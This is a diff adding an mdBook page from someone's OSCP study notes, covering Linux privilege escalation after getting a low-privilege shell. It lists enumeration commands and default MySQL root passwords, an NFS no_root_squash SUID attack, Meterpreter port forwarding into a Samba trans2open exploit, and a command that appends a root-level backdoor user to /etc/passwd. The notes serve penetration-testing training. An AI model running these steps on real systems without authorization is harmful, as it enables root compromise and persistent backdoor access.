@@ -1,0 +1,409 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>S1REN&#x27;s Notes - Brandon&#x27;s OSCP Notes</title>
+
+
+        <!-- Custom HTML head -->
+        
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+    </head>
+    <body class="sidebar-visible no-js">
+    <div id="body-container">
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('light')
+            html.classList.add(theme);
+            var body = document.querySelector('body');
+            body.classList.remove('no-js')
+            body.classList.add('js');
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var body = document.querySelector('body');
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            body.classList.remove('sidebar-visible');
+            body.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded "><a href="Introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> The Things</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="Quick Notes.html"><strong aria-hidden="true">2.1.</strong> Quick Notes</a></li><li class="chapter-item expanded "><a href="Scanning.html"><strong aria-hidden="true">2.2.</strong> Scanning</a></li><li class="chapter-item expanded "><a href="File Transfer.html"><strong aria-hidden="true">2.3.</strong> File Transfer</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="AddnlFileTrasnfer.html"><strong aria-hidden="true">2.3.1.</strong> Additional File Transfer</a></li></ol></li><li class="chapter-item expanded "><a href="Ports.html"><strong aria-hidden="true">2.4.</strong> Ports</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="SSHKeys.html"><strong aria-hidden="true">2.4.1.</strong> SSH Keys</a></li></ol></li><li class="chapter-item expanded "><a href="Shells.html"><strong aria-hidden="true">2.5.</strong> Shells</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Gaining Access</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="CrackMapExecCheatSheet.html"><strong aria-hidden="true">3.1.</strong> CrackMapExec Cheat Sheet</a></li><li class="chapter-item expanded "><a href="Impacket.html"><strong aria-hidden="true">3.2.</strong> Impacket</a></li><li class="chapter-item expanded "><a href="RDPEXploit.html"><strong aria-hidden="true">3.3.</strong> RDP Exploits</a></li><li class="chapter-item expanded "><a href="Web Shells.html"><strong aria-hidden="true">3.4.</strong> Web Shells</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.5.</strong> Password Cracking</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="My Hashcat Cheatsheet.html"><strong aria-hidden="true">3.5.1.</strong> Hashcat Cheat Sheet</a></li><li class="chapter-item expanded "><a href="My Hydra Cheatsheet.html"><strong aria-hidden="true">3.5.2.</strong> Hydra Cheat Sheet</a></li><li class="chapter-item expanded "><a href="Bruteforce.html"><strong aria-hidden="true">3.5.3.</strong> Bruteforce</a></li></ol></li><li class="chapter-item expanded "><a href="Buffer Overflow.html"><strong aria-hidden="true">3.6.</strong> Buffer Overflow</a></li><li class="chapter-item expanded "><a href="File Uploads.html"><strong aria-hidden="true">3.7.</strong> File Uploads</a></li><li class="chapter-item expanded "><a href="AddnlFileUpload.html"><strong aria-hidden="true">3.8.</strong> Additional File Upload</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="htmlfileupload.html"><strong aria-hidden="true">3.8.1.</strong> HTML</a></li><li class="chapter-item expanded "><a href="MyMacros.html"><strong aria-hidden="true">3.8.2.</strong> Macro</a></li><li class="chapter-item expanded "><a href="OLEFileUpload.html"><strong aria-hidden="true">3.8.3.</strong> OLE</a></li></ol></li><li class="chapter-item expanded "><a href="LFIRFI.html"><strong aria-hidden="true">3.9.</strong> LFI/RFI</a></li><li class="chapter-item expanded "><a href="ShellShock.html"><strong aria-hidden="true">3.10.</strong> Shell Shock</a></li><li class="chapter-item expanded "><a href="Github.html"><strong aria-hidden="true">3.11.</strong> Github</a></li><li class="chapter-item expanded "><a href="MySQL.html"><strong aria-hidden="true">3.12.</strong> SQL</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="PSQL.html"><strong aria-hidden="true">3.12.1.</strong> PSQL</a></li><li class="chapter-item expanded "><a href="MyMySql.html"><strong aria-hidden="true">3.12.2.</strong> MySQL</a></li><li class="chapter-item expanded "><a href="MSSQL.html"><strong aria-hidden="true">3.12.3.</strong> MSSQL</a></li></ol></li><li class="chapter-item expanded "><a href="WindowLibraries.html"><strong aria-hidden="true">3.13.</strong> Windows Libraries and APIs</a></li><li class="chapter-item expanded "><a href="XXEXSSDeSerial.html"><strong aria-hidden="true">3.14.</strong> XXE_XSS_Deserialization</a></li><li class="chapter-item expanded "><a href="DirectoryTraveral.html"><strong aria-hidden="true">3.15.</strong> Directory Traversal</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Linux PrivEsc</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="LinuxEnum.html"><strong aria-hidden="true">4.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="LinuxPrivExploit.html"><strong aria-hidden="true">4.2.</strong> Exploit</a></li><li class="chapter-item expanded "><a href="S1RENLinNotes.html" class="active"><strong aria-hidden="true">4.3.</strong> S1REN's Notes</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.</strong> Windows PrivEsc</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="WinPrivEnum.html"><strong aria-hidden="true">5.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="WinPrivExploit.html"><strong aria-hidden="true">5.2.</strong> Exploit</a></li><li class="chapter-item expanded "><a href="S1RENWinNotes.html"><strong aria-hidden="true">5.3.</strong> S1REN's Notes</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">6.</strong> Active Directory</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="KerberosCheetSheet.html"><strong aria-hidden="true">6.1.</strong> Kerberos Cheat Sheet</a></li><li class="chapter-item expanded "><a href="WeGotUsersbutnoPass.html"><strong aria-hidden="true">6.2.</strong> We got Users but no Pass?</a></li><li class="chapter-item expanded "><a href="ADEnum.html"><strong aria-hidden="true">6.3.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="ADAuth.html"><strong aria-hidden="true">6.4.</strong> Authentication</a></li><li class="chapter-item expanded "><a href="ADPivoting.html"><strong aria-hidden="true">6.5.</strong> Pivoting</a></li><li class="chapter-item expanded "><a href="ADLateralMovement.html"><strong aria-hidden="true">6.6.</strong> Lateral Movement</a></li><li class="chapter-item expanded "><a href="ADHashDump.html"><strong aria-hidden="true">6.7.</strong> Hash Dumping</a></li><li class="chapter-item expanded "><a href="ADPersistence.html"><strong aria-hidden="true">6.8.</strong> Persistence</a></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <!-- Track and set sidebar scroll position -->
+        <script>
+            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
+            sidebarScrollbox.addEventListener('click', function(e) {
+                if (e.target.tagName === 'A') {
+                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
+                }
+            }, { passive: true });
+            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
+            sessionStorage.removeItem('sidebar-scroll');
+            if (sidebarScrollTop) {
+                // preserve sidebar scroll position when navigating via links within sidebar
+                sidebarScrollbox.scrollTop = sidebarScrollTop;
+            } else {
+                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
+                var activeSection = document.querySelector('#sidebar .active');
+                if (activeSection) {
+                    activeSection.scrollIntoView({ block: 'center' });
+                }
+            }
+        </script>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Brandon&#x27;s OSCP Notes</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <p><strong>g0tmilk's Guide to Linux Privilege Escalation as well:</strong><br />
+<a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/<br />
+</a><br />
+<strong>I just got a low-priv shell !</strong><br />
+What would S1REN do <em>right now</em>?<br />
+<strong>python</strong> -c 'import pty; pty.spawn("/bin/bash")'<br />
+OR<br />
+<strong>python3</strong> -c 'import pty; pty.spawn("/bin/bash")'<br />
+export <strong>PATH</strong>=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp<br />
+export <strong>TERM</strong>=xterm-256color<br />
+alias <strong>ll</strong>='ls -lsaht --color=auto'<br />
+<strong>Ctrl + Z</strong> [Background Process]<br />
+stty raw -echo <strong>;</strong> fg <strong>;</strong> reset<br />
+stty columns 200 rows 200</p>
+<p><strong>S1REN would say:</strong><br />
+<em>Various Capabilities?</em><br />
+which <strong>gcc</strong><br />
+which <strong>cc</strong><br />
+which <strong>python</strong><br />
+which <strong>perl</strong><br />
+which <strong>wget</strong><br />
+which <strong>curl</strong><br />
+which <strong>fetch</strong><br />
+which <strong>nc</strong><br />
+which <strong>ncat</strong><br />
+which <strong>nc.traditional</strong><br />
+which <strong>socat</strong></p>
+<p><strong>Compilation? (<strong>Very Back Burner</strong>)</strong><br />
+<strong>file</strong> /<strong>bin</strong>/<strong>bash</strong><br />
+<strong>uname -a</strong><br />
+cat /<strong>etc</strong>/*<strong>-release</strong><br />
+cat /<strong>etc</strong>/<strong>issue</strong></p>
+<p><strong>What Arch?</strong><br />
+file /bin/bash</p>
+<p><strong>Kernel?</strong><br />
+uname -a</p>
+<p><strong>Issue/Release?</strong><br />
+cat /etc/issue<br />
+cat /etc/***-**release</p>
+<p><strong>Are we a <em>real user</em>?</strong><br />
+sudo -l<br />
+ls -lsaht /etc/sudoers</p>
+<p><strong>Are any users a member of exotic groups?</strong><br />
+groups <user></p>
+<p><strong>Check out your shell's environment variables...</strong><br />
+env<br />
+<a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a></p>
+<p><strong><em>Users</em>?</strong><br />
+cd /home/<br />
+ls -lsaht</p>
+<p><strong><em>Web Configs</em> containing credentials?</strong><br />
+cd /<strong>var</strong>/<strong>www</strong>/<strong>html</strong>/<br />
+ls -lsaht</p>
+<p><strong><em>SUID</em> Binaries?</strong><br />
+find <strong>/</strong> -perm <strong>-u=s</strong> -type f 2&gt;/<strong>dev</strong>/<strong>null</strong></p>
+<p><strong><em>GUID</em> Binaries?</strong><br />
+find <strong>/</strong> -perm <strong>-g=s</strong> -type f 2&gt;/<strong>dev</strong>/<strong>null</strong></p>
+<p><strong>SUID/GUID/SUDO <em>Escalation</em>:</strong><br />
+<a href="https://gtfobins.github.io/">https://gtfobins.github.io/<br />
+</a></p>
+<p><strong>Binary/Languages with "<em>Effective Permitted</em>" or "<em>Empty Capability</em>" (<strong>ep</strong>):</strong><br />
+<a href="https://www.insecure.ws/linux/getcap_setcap.html#getcap-setcap-and-file-capabilities">https://www.insecure.ws/linux/getcap_setcap.html#getcap-setcap-and-file-capabilities<br />
+</a>Get Granted/Implicit (Required by a Real User) Capabilities of all files recursively throughout the system and pipe all error messages to /dev/null.<br />
+getcap -r / 2&gt;/dev/null</p>
+<p><strong>We need to start monitoring the system if possible while performing our enumeration...</strong><br />
+<strong>In other words:</strong><br />
+"S1REN... <em>Is privilege escalation going to come from some I/O file operations being done by some script on the system?</em>"<br />
+<a href="https://github.com/DominicBreuker/pspy/blob/master/README.md">https://github.com/DominicBreuker/pspy/blob/master/README.md<br />
+</a>cd /var/tmp/<br />
+File Transfer <strong>--&gt;</strong> pspy32<br />
+File Transfer <strong>--&gt;</strong> pspy64<br />
+chmod 755 pspy32 pspy64<br />
+./pspy&lt;32/64&gt;</p>
+<p><strong>What does the local network look like?</strong><br />
+netstat -antup<br />
+netstat -tunlp</p>
+<p><strong>Is anything vulnerable running as root?</strong><br />
+ps aux |grep -i 'root' --color=auto</p>
+<p><strong>MYSQL Credentials? Root Unauthorized Access?</strong><br />
+mysql -uroot -p<br />
+Enter Password:<br />
+root : root<br />
+root : toor<br />
+root :</p>
+<p><strong>S1REN would take a quick look at etc to see if any user-level people did special things:</strong><br />
+cd /<strong>etc</strong>/<br />
+ls -lsaht<br />
+<em>Anything other than root here?</em><br />
+• Any config files left behind?<br />
+→ ls -lsaht |grep -i ‘.conf’ --color=auto</p>
+<p><strong>• If we have root priv information disclosure - are there any .secret in /etc/ files?</strong><br />
+→ ls -lsaht |grep -i ‘.secret’ --color=aut</p>
+<p><strong>SSH Keys I can use perhaps for even further compromise?</strong><br />
+ls -lsaR /<strong>home</strong>/</p>
+<p><strong>Quick look in:</strong><br />
+ls -lsaht /<strong>var</strong>/<strong>lib</strong>/<br />
+ls -lsaht /<strong>var</strong>/<strong>db</strong>/</p>
+<p><strong>Quick look in:</strong><br />
+ls -lsaht /<strong>opt</strong>/<br />
+ls -lsaht /<strong>tmp</strong>/<br />
+ls -lsaht /<strong>var</strong>/<strong>tmp</strong>/<br />
+ls -lsaht /<strong>dev</strong>/<strong>shm</strong>/</p>
+<p><strong>File Transfer Capability? What can I use to transfer files?</strong><br />
+which wget<br />
+which curl<br />
+which nc<br />
+which fetch (BSD)<br />
+ls -lsaht /bin/ |grep -i 'ftp' --color=auto</p>
+<p><strong>NFS? Can we exploit weak NFS Permissions?</strong><br />
+cat /<strong>etc</strong>/<strong>exports</strong><br />
+no_root_squash?<br />
+<a href="https://recipeforroot.com/attacking-nfs-shares/">https://recipeforroot.com/<strong>attacking-nfs-shares</strong>/<br />
+</a><br />
+<strong>[On Attacking Machine]</strong><br />
+mkdir -p /<strong>mnt</strong>/<strong>nfs</strong>/<br />
+mount <strong>-t</strong> nfs <strong>-o</strong> <strong>vers</strong>=&lt;version 1,2,3&gt; <strong>$IP:</strong><NFS Share> /<strong>mnt</strong>/<strong>nfs</strong>/ <strong>-nolock</strong><br />
+gcc suid.c <strong>-o</strong> suid<br />
+cp suid /<strong>mnt</strong>/<strong>nfs</strong>/<br />
+chmod u+s /<strong>mnt</strong>/<strong>nfs</strong>/<strong>suid</strong><br />
+su &lt;user id matching target machine's user-level privilege.&gt;</p>
+<p><strong>[On Target Machine]</strong><br />
+user@host$ ./suid<br />
+<strong>#</strong></p>
+<p><strong><em>Where can I live on this machine?</em> Where can I read, write and execute files?</strong><br />
+/<strong>var</strong>/<strong>tmp</strong>/<br />
+/<strong>tmp</strong>/<br />
+/<strong>dev</strong>/<strong>shm</strong>/</p>
+<p><strong>Any exotic file system mounts/extended attributes?</strong><br />
+cat /<strong>etc</strong>/<strong>fstab</strong></p>
+<p><strong>Forwarding out a weak service for root priv (with meterpreter!):</strong><br />
+Do we need to get a meterpreter shell and forward out some ports that might be running off of the Loopback Adaptor (127.0.0.1) and forward them to any (0.0.0.0)? If I see something like Samba SMBD out of date on 127.0.0.1 - we should look to forward out the port and then run trans2open on our own machine at the forwarded port.<br />
+<a href="https://www.offensive-security.com/metasploit-unleashed/portfwd/">https://www.offensive-security.com/metasploit-unleashed/portfwd/</a></p>
+<p><strong>Forwarding out netbios-ssn EXAMPLE:</strong><br />
+<strong>meterpreter&gt;</strong> portfwd add –l 139 –p 139 –r [target remote host]<br />
+<strong>meterpreter&gt;</strong> background<br />
+use exploit/linux/samba/trans2open<br />
+set RHOSTS 0.0.0.0<br />
+set RPORT 139<br />
+run</p>
+<p><strong>Can we write as a low-privileged user to /etc/passwd?</strong><br />
+openssl passwd -1<br />
+i&lt;3hacking<br />
+$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.<br />
+echo 'siren:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:siren:/home/siren:/bin/bash' &gt;&gt; /etc/passwd<br />
+su siren<br />
+id</p>
+<p><strong>Cron.</strong><br />
+crontab –u root –l</p>
+<p><strong>Look for unusual system-wide cron jobs:</strong><br />
+cat /etc/<strong>crontab</strong><br />
+ls /etc/<strong>cron.</strong>*</p>
+<p><strong>Bob is a user on this machine. What is every single file he has ever created?</strong><br />
+find / -user <strong>miguel</strong> 2&gt;/dev/null</p>
+<p><strong>Any mail?</strong> <strong>mbox in User $HOME directory?</strong><br />
+cd /<strong>var</strong>/<strong>mail</strong>/<br />
+ls -lsaht</p>
+<p><strong>Linpease</strong>:<br />
+<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS<br />
+</a><br />
+<strong>Traitor:</strong><br />
+<a href="https://github.com/liamg/traitor">https://github.com</a><a href="https://github.com/liamg/traitor">/</a><a href="https://github.com/liamg/traitor">liamg/traitor<br />
+</a><br />
+<strong>GTFOBins:</strong><br />
+<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
+<p><strong>PSpy32/Pspy64:</strong><br />
+<a href="https://github.com/DominicBreuker/pspy/blob/master/README.md">https://github.com/DominicBreuker/pspy/blob/master/README.md</a></p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="LinuxPrivExploit.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="WinPrivEnum.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="LinuxPrivExploit.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="WinPrivEnum.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr.min.js"></script>
+        <script src="mark.min.js"></script>
+        <script src="searcher.js"></script>
+
+        <script src="clipboard.min.js"></script>
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
